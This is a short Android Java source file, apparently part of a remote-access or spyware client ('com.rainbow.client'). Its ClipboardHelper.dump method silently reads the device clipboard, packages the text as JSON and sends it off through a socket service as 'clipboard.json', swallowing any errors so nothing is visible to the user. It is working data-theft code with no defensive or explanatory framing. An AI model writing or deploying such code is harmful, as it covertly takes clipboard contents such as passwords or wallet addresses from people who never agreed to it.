package com.rainbow.client;

import android.content.ClipboardManager;
import android.content.Context;
import org.json.JSONObject;

public class ClipboardHelper {
    public static void dump(Context ctx) {
        try {
            ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            String text = cm.getText() != null ? cm.getText().toString() : "";
            JSONObject o = new JSONObject();
            o.put("clipboard", text);
            SocketService2.sendFile("clipboard.json", o.toString().getBytes());
        } catch (Exception ignored) {}
    }
}